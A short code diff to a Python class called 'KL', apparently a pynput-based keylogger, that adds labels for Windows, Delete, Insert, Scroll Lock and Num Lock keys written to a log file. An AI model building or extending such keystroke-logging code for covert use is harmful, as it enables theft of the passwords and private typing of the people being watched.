@@ -88,6 +88,20 @@ class KL:
 						file.write(" [F11] ")
 					elif i == "Key.f12":
 						file.write(" [F12] ")
+					elif i == "Key.cmd":
+						file.write(" [WIN] ") #bruh, i don't know that windows button can be detected using pynput
+					elif i == "Key.cmd_l":
+						file.write(" [WIN] ")
+					elif i == "Key.cmd_r":
+						file.write(" [WIN] ")
+					elif i == "Key.delete":
+						file.write(" [DEL] ")
+					elif i == "Key.insert":
+						file.write(" [INS] ")
+					elif i == "Key.scroll_lock":
+						file.write(" [SCL] ")
+					elif i == "Key.num_lock":
+						file.write(" [NL] ")
 					else:
 						file.write(i)
 
